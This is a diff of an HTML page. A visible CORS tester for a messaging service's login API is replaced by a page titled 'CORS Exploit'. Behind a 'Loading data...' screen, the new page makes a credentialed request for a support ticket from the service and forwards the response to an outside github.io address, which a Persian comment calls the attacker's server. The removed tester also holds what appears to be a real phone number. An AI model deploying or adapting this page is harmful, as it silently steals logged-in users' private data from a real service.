@@ -1,76 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Eitaa loginByEitaa CORS Tester</title>
-    <style>
-        body { font-family: monospace; padding: 20px; }
-        input, textarea { width: 100%; margin-bottom: 10px; }
-        button { padding: 10px; }
-        pre { background: #111; color: #0f0; padding: 10px; white-space: pre-wrap; }
-    </style>
+    <title>CORS Exploit</title>
 </head>
 <body>
-
-<h2>Raw loginByEitaa CORS Tester</h2>
-
-<p>Phone:</p>
-<input id="phone" value="09373371480">
-
-<p>Optional Origin:</p>
-<input id="origin" value="https://alirh2003.github.io">
-
-<button onclick="send()">Send Request</button>
-
-<pre id="out"></pre>
+<h2>Loading data...</h2>
 
 <script>
-
-async function send() {
-
-    const phone = document.getElementById("phone").value;
-    const origin = document.getElementById("origin").value;
-
-    const url = "https://my.eitaa.com/api/v1/loginByEitaa";
-
-    const payload = {
-        phone: phone
-    };
-
-    try {
-
-        const res = await fetch(url, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Accept": "application/json",
-                "Origin": origin
-            },
-
-            credentials: "include",
-            body: JSON.stringify(payload)
-        });
-
-        const text = await res.text();
-
-        let headers = "";
-        res.headers.forEach((v, k) => {
-            headers += k + ": " + v + "\n";
-        });
-
-        document.getElementById("out").innerText =
-            "STATUS: " + res.status + "\n\n" +
-            "=== RESPONSE HEADERS ===\n" +
-            headers +
-            "\n=== RESPONSE BODY ===\n" +
-            text;
-
-    } catch (e) {
-
-        document.getElementById("out").innerText =
-            "CORS BLOCKED / NETWORK ERROR:\n" + e;
-    }
-}
-
+fetch("https://my.eitaa.com/api/v1/ticket/show/372971", {
+    method: "POST",
+    credentials: "include"
+})
+.then(res => res.json())
+.then(data => {
+    // ارسال داده به سرور مهاجم
+    fetch("https://alirh2003.github.io/e-cors/e-cors.html", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    });
+});
 </script>
 
 </body>
